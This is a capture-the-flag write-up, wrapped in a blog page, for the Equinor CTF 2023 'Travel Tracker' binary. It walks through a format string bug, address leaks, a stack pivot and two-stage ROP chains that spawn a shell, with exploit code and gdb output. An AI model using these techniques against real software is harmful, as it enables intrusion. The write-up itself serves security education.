@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>Equinor CTF 2023 - Travel Tracker | kileak</title>
+
+
+
+
+
+<meta name="description" content="Equinor CTF 2023 - Travel Tracker">
+
+
+<meta name="keywords" content="equinor, travel tracker">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2023/equinor23-traveltracker/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">Equinor CTF 2023 - Travel Tracker</h1>
+      <p class="post-meta">Nov 11, 2023</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>Equinor CTF 2023 - Travel Tracker
+<!--break--></p>
+
+  <p>I found our legacy travel tracker, does it still work?</p>
+
+  <p>Author: nordbo</p>
+
+  <p>Team: Super Guesser</p>
+
+  <p>Attachment: 
+<a href="https://kileak.github.io/assets/equinor23/travel/travel_tracker.tar.gz">travel_tracker.tar.gz</a> 
+<a href="https://kileak.github.io/assets/equinor23/travel/xpl.py">xpl.py</a></p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Travel Tracker Menu
+1. Add airport review
+2. View all airport reviews
+3. Save all airport reviews to file
+4. Modify an airport review
+5. Exit
+Enter your choice: </code></pre></figure>
+
+<p>Travel tracker lets us add, view and edit reviews. Nothing special there, but it also contains an option to save the reviews.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">saveReviewsToFile</span><span class="p">()</span> <span class="p">{</span>
+    <span class="c1">//There was a bug when writing to file.</span>
+    <span class="c1">//Fixed by writing to the void.</span>
+    <span class="kt">FILE</span> <span class="o">*</span><span class="n">file</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"/dev/null"</span><span class="p">,</span> <span class="s">"w"</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">file</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">perror</span><span class="p">(</span><span class="s">"Error opening file"</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">reviewCount</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+       <span class="n">writeToFile</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">file</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Reviews have been saved. </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">writeToFile</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="kt">FILE</span> <span class="o">*</span><span class="n">file</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">char</span><span class="o">*</span> <span class="n">comment</span> <span class="o">=</span> <span class="n">reviews</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">comment</span><span class="p">;</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="s">"Airport Code"</span><span class="p">);</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">reviews</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">airportCode</span><span class="p">);</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">Rating: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">reviews</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">rating</span><span class="p">);</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="s">"Comment: %s</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span> <span class="n">comment</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>This will open <code class="language-plaintext highlighter-rouge">/dev/null</code> and then print the review to it. <code class="language-plaintext highlighter-rouge">writeToFile</code> contains a format string vulnerability, since it just calls</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">fprintf</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">reviews</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">airportCode</span><span class="p">);</span></code></pre></figure>
+
+<p>We won’t be able to see the output of it, since it’s written to <code class="language-plaintext highlighter-rouge">/dev/null</code>, but we can still exploit it. <code class="language-plaintext highlighter-rouge">airportCode</code> can only contain 10 chars, so it will be a bit of a hassle to do something useful with it.</p>
+
+<p>With gdb we can find the possible parameters, that can be used</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">1 : 0xffffd3a8│+0x0000: 0x0000000c
+2 : 0xffffd3ac│+0x0004: 0x5655a2d0  →  0xfbad2c84
+3 : 0xffffd3b0│+0x0008: 0x565571d1  →  "/dev/null"
+4 : 0xffffd3b4│+0x000c: 0x565571cf  →  0x642f0077 ("w"?)
+5 : 0xffffd3b8│+0x0010: 0x00000001
+6 : 0xffffd3bc│+0x0014: 0x5655a1c0  →  "AAAAAAAAAAAAAAAAAAAAA[...]"
+7 : 0xffffd3c0│+0x0018: 0xffffd4e4  →  0xffffd64a  
+8 : 0xffffd3c4│+0x001c: 0x56558f80  →  0x00003e88
+9 : 0xffffd3c8│+0x0020: 0xffffd3f8 
+...</code></pre></figure>
+
+<p>Parameter 6 will contain a pointer to our <code class="language-plaintext highlighter-rouge">comment</code> chunk on the heap. Since we first need some leaks, we can use this to write into the <code class="language-plaintext highlighter-rouge">comment</code> field to get some pointers.</p>
+
+<p>Though as already mentioned, the possible format string is only 10 chars and the string is on the heap, so we cannot reuse addresses from our input.</p>
+
+<p>But we can use a neat little trick using dynamic width parameters for <code class="language-plaintext highlighter-rouge">printf</code></p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">%*3$u%6$n</code></pre></figure>
+
+<p>With <code class="language-plaintext highlighter-rouge">*3</code> we specify, that the width for the string should come from the third format string parameter. This would write a string with <code class="language-plaintext highlighter-rouge">0x565571d1</code> whitespaces. <code class="language-plaintext highlighter-rouge">%6$n</code> will then write the count of written characters to the address at parameter 6, which is our comment chunk.</p>
+
+<p>This will effectively write <code class="language-plaintext highlighter-rouge">0x565571d1</code> into our comment field, which we then can read via <code class="language-plaintext highlighter-rouge">View all airport reviews</code>.</p>
+
+<p>We’ll use this, to leak an ELF, heap and libc address.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">offset</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">"%*{0}$u%6$n"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+    <span class="n">writetofile</span><span class="p">()</span>
+    <span class="n">LEAK</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">view</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">"Comment: "</span><span class="p">)[</span><span class="mi">1</span><span class="p">][:</span><span class="mi">4</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">LEAK</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"choice: "</span><span class="p">)</span>
+
+    <span class="c1"># create initial review
+</span>    <span class="n">add</span><span class="p">(</span><span class="s">"AAAA"</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="s">"AAAA"</span><span class="p">)</span>
+
+    <span class="c1"># leak ELF / heap and libc address
+</span>    <span class="n">PIELEAK</span> <span class="o">=</span> <span class="n">leak</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+    <span class="n">HEAPLEAK</span> <span class="o">=</span> <span class="n">leak</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+    <span class="n">LIBCLEAK</span> <span class="o">=</span> <span class="mh">0x100000000</span> <span class="o">-</span> <span class="n">leak</span><span class="p">(</span><span class="mi">13</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] PIE leak     : 0x565571d1
+[*] ELF          : 0x56555000
+[*] HEAP leak    : 0x5655a1c0
+[*] LIBC  leak   : 0xf7fb3620
+[*] LIBC         : 0xf7d89000</code></pre></figure>
+
+<p>With those addresses at hand, we can now craft a ropchain in our <code class="language-plaintext highlighter-rouge">comment</code> chunk and try to pivot the stack into it.</p>
+
+<p>We can again use the dynamic width trick to now write the address of our comment chunk into <code class="language-plaintext highlighter-rouge">ebp</code>, which parameter 9 points to.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">%*6$u%9$n</code></pre></figure>
+
+<p>This will take the address of <code class="language-plaintext highlighter-rouge">comment</code> from parameter 6 as width and then writes it to parameter 9.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x565564b2 &lt;+277&gt;:	lea    esp,[ebp-0x8]
+0x565564b5 &lt;+280&gt;:	pop    ecx
+0x565564b6 &lt;+281&gt;:	pop    ebx
+0x565564b7 &lt;+282&gt;:	pop    ebp
+0x565564b8 &lt;+283&gt;:	lea    esp,[ecx-0x4]
+0x565564bb &lt;+286&gt;:	ret</code></pre></figure>
+
+<p>The prologue of main would then move the stack 8 bytes before our heap chunk, pop <code class="language-plaintext highlighter-rouge">ecx</code> from there and then loads <code class="language-plaintext highlighter-rouge">ecx-0x4</code> into <code class="language-plaintext highlighter-rouge">esp</code> again.</p>
+
+<p>So we cannot directly pivot into our chunk. To get around this, we can first allocate a bigger <code class="language-plaintext highlighter-rouge">comment</code> chunk, fill it up with addresses to our final <code class="language-plaintext highlighter-rouge">comment</code> chunk, free it via <code class="language-plaintext highlighter-rouge">edit</code> and then trigger the stack pivot.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># create a heap chunk filled with address to rop chain
+</span><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">HEAPLEAK</span><span class="o">+</span><span class="mh">0x180</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"A"</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span>
+
+<span class="n">POP1</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x15e6</span>    
+<span class="n">POPECXEAX</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x128124</span>
+<span class="n">POPEBX</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x1022</span>    
+<span class="n">POPEDX</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x37375</span>
+<span class="n">SYSCALL</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x37765</span>
+<span class="n">POPESP</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x000262de</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Send stage 1 ropchain"</span><span class="p">)</span>
+
+<span class="n">rop</span> <span class="o">=</span> <span class="s">""</span>    
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"gets"</span><span class="p">])</span>    
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">POP1</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x4550</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">POPESP</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x4550</span><span class="p">)</span>
+    
+<span class="c1"># write chunk address into stack pointer
+</span><span class="n">payload</span> <span class="o">=</span> <span class="s">"%*6$u%9$n"</span>
+
+<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="n">rop</span><span class="p">)</span>
+<span class="n">writetofile</span><span class="p">()</span>
+
+<span class="c1"># exit to trigger ropchain
+</span><span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"5)</span></code></pre></figure>
+
+<p>While locally, I could just do a <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code> ropchain, it didn’t work out remote, so I opted for a stage ropchain.</p>
+
+<p>Since the comment will be moved to the heap via <code class="language-plaintext highlighter-rouge">strcpy</code> it must not contain any null bytes, but for an <code class="language-plaintext highlighter-rouge">execve("/bin/sh", 0, 0)</code> ropchain, I’d need some. So the first ropchain will just read the final chain into <code class="language-plaintext highlighter-rouge">bss</code> and then stack pivot there.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">───────────────────────────────────────────── registers ────
+$eax   : 0x0       
+$ebx   : 0x56558f80  →  0x00003e88
+$ecx   : 0xf7fb49b4  →  0x00000000
+$edx   : 0x1       
+$esp   : 0xffffddf0  →  0xffffde30  →  0xf7fb3000  →  0x00229dac
+$ebp   : 0x5655a340  →  0xf7dfb8f0  →  0xfb1e0ff3
+$esi   : 0xffffded4  →  0xffffdfbf  →  "./travel_tracker"
+$edi   : 0xf7ffcb80  →  0x00000000
+$eip   : 0x565564b2  →  &lt;main+277&gt; lea esp, [ebp-0x8]
+$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
+─────────────────────────────────────────── code:x86:32 ────
+   0x565564a3 &lt;main+262&gt;       cmp    DWORD PTR [ebp-0xc], 0x5
+   0x565564a7 &lt;main+266&gt;       jne    0x565563c4 &lt;main+39&gt;
+   0x565564ad &lt;main+272&gt;       mov    eax, 0x0
+ → 0x565564b2 &lt;main+277&gt;       lea    esp, [ebp-0x8]
+   0x565564b5 &lt;main+280&gt;       pop    ecx
+   0x565564b6 &lt;main+281&gt;       pop    ebx
+   0x565564b7 &lt;main+282&gt;       pop    ebp
+   0x565564b8 &lt;main+283&gt;       lea    esp, [ecx-0x4]
+   0x565564bb &lt;main+286&gt;       ret    
+───────────────────────────────────────────────── stack ────
+0xffffddf0│+0x0000: 0xffffde30  →  0xf7fb3000  →  0x00229dac	 ← $esp
+0xffffddf4│+0x0004: 0xf7fbe65c  →  0xf7ffdba0  →  0xf7fbe800  →  0xf7ffda40  →  0x56555000  →  0x464c457f
+0xffffddf8│+0x0008: 0xf7fbebc0  →  0xf7da3cc6  →  "GLIBC_PRIVATE"
+0xffffddfc│+0x000c: 0x00000003
+0xffffde00│+0x0010: 0xffffde20  →  0x00000001
+0xffffde04│+0x0014: 0xf7fb3000  →  0x00229dac
+────────────────────────────────────────────────────────────</code></pre></figure>
+
+<p>After <code class="language-plaintext highlighter-rouge">pop ecx</code></p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">───────────────────────────────────────────── registers ────
+$eax   : 0x0       
+$ebx   : 0x56558f80  →  0x00003e88
+$ecx   : 0xf7fb49b4  →  0x00000000
+$edx   : 0x1       
+$esp   : 0x5655a338  →  0x5655a344  →  0x565565e6  →  &lt;addReview+298&gt; pop ebp
+$ebp   : 0x5655a340  →  0xf7dfb8f0  →  0xfb1e0ff3
+$esi   : 0xffffded4  →  0xffffdfbf  →  "./travel_tracker"
+$edi   : 0xf7ffcb80  →  0x00000000
+$eip   : 0x565564b5  →  &lt;main+280&gt; pop ecx
+$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
+─────────────────────────────────────────── code:x86:32 ────
+   0x565564a7 &lt;main+266&gt;       jne    0x565563c4 &lt;main+39&gt;
+   0x565564ad &lt;main+272&gt;       mov    eax, 0x0
+   0x565564b2 &lt;main+277&gt;       lea    esp, [ebp-0x8]
+ → 0x565564b5 &lt;main+280&gt;       pop    ecx
+   0x565564b6 &lt;main+281&gt;       pop    ebx
+   0x565564b7 &lt;main+282&gt;       pop    ebp
+   0x565564b8 &lt;main+283&gt;       lea    esp, [ecx-0x4]
+   0x565564bb &lt;main+286&gt;       ret    
+   0x565564bc &lt;addReview+0&gt;    push   ebp
+───────────────────────────────────────────────── stack ────
+0x5655a338│+0x0000: 0x5655a344  →  0x565565e6  →  &lt;addReview+298&gt; pop ebp	 ← $esp
+0x5655a33c│+0x0004: 0x00000021 ("!"?)
+0x5655a340│+0x0008: 0xf7dfb8f0  →  0xfb1e0ff3	 ← $ebp
+0x5655a344│+0x000c: 0x565565e6  →  &lt;addReview+298&gt; pop ebp
+0x5655a348│+0x0010: 0x56559550  →  0x00000000
+0x5655a34c│+0x0014: 0xf7daf2de  →  0x5f5e5b5c
+────────────────────────────────────────────────────────────</code></pre></figure>
+
+<p>So <code class="language-plaintext highlighter-rouge">ecx</code> now points exactly to <code class="language-plaintext highlighter-rouge">comment+0x4</code>, and <code class="language-plaintext highlighter-rouge">lea esp, [ecx-0x4]</code> will stack pivot into the comment chunk.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">───────────────────────────────────────────── registers ────
+$eax   : 0x0       
+$ebx   : 0x21      
+$ecx   : 0x5655a344  →  0x565565e6  →  &lt;addReview+298&gt; pop ebp
+$edx   : 0x1       
+$esp   : 0x5655a340  →  0xf7dfb8f0  →  0xfb1e0ff3
+$ebp   : 0xf7dfb8f0  →  0xfb1e0ff3
+$esi   : 0xffffded4  →  0xffffdfbf  →  "./travel_tracker"
+$edi   : 0xf7ffcb80  →  0x00000000
+$eip   : 0x565564bb  →  &lt;main+286&gt; ret 
+$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
+─────────────────────────────────────────── code:x86:32 ────
+   0x565564b6 &lt;main+281&gt;       pop    ebx
+   0x565564b7 &lt;main+282&gt;       pop    ebp
+   0x565564b8 &lt;main+283&gt;       lea    esp, [ecx-0x4]
+ → 0x565564bb &lt;main+286&gt;       ret    
+   ↳  0xf7dfb8f0                  endbr32 
+      0xf7dfb8f4                  push   ebp
+      0xf7dfb8f5                  mov    ebp, esp
+      0xf7dfb8f7                  push   edi
+      0xf7dfb8f8                  call   0xf7efae3d
+      0xf7dfb8fd                  add    edi, 0x1b7703
+───────────────────────────────────────────────── stack ────
+0x5655a340│+0x0000: 0xf7dfb8f0  →  0xfb1e0ff3	 ← $esp
+0x5655a344│+0x0004: 0x565565e6  →  &lt;addReview+298&gt; pop ebp	 ← $ecx
+0x5655a348│+0x0008: 0x56559550  →  0x00000000
+0x5655a34c│+0x000c: 0xf7daf2de  →  0x5f5e5b5c
+0x5655a350│+0x0010: 0x56559550  →  0x00000000
+0x5655a354│+0x0014: 0x5655a300  →  0x00000000
+────────────────────────────────────────────────────────────</code></pre></figure>
+
+<p>We can now send the second ropchain, which will then do <code class="language-plaintext highlighter-rouge">execve("/bin/sh", 0, 0)</code></p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">log.info("Send stage 2 ropchain")
+
+POPECXEAX = libc.address + 0x128124
+POPEBX = e.address + 0x1022    
+POPEDX = libc.address + 0x37375
+SYSCALL = libc.address + 0x37765
+
+rop = ""
+rop += p32(0)
+rop += p32(0)
+rop += p32(0)
+rop += p32(0)
+rop += p32(POPECXEAX)
+rop += p32(0)
+rop += p32(11)
+rop += p32(POPEBX)
+rop += p32(next(libc.search("/bin/sh")))
+rop += p32(POPEDX)
+rop += p32(0)
+rop += p32(SYSCALL)
+    
+r.sendline(rop)</code></pre></figure>
+
+<p>which then finally lands a shell</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[+] Opening connection to io.ept.gg on port 51041: Done
+[*] PIE leak     : 0x565b51d1
+[*] ELF          : 0x565b3000
+[*] HEAP leak    : 0x56c861c0
+[*] LIBC  leak   : 0xf7fa7620
+[*] LIBC         : 0xf7d7d000
+[*] Switching to interactive mode
+Exiting the program...
+$ ls
+travel_tracker
+ynetd
+$ cat /opt/flag
+EPT{l3gacy_l0v3}$  </code></pre></figure>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=Equinor CTF 2023 - Travel Tracker&amp;url=https://kileak.github.io/ctf/2023/equinor23-traveltracker/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2023/equinor23-traveltracker/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2023/equinor23-traveltracker';
+        var disqus_title = 'Equinor CTF 2023 - Travel Tracker';
+        var disqus_url = 'https://kileak.github.io/ctf/2023/equinor23-traveltracker';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
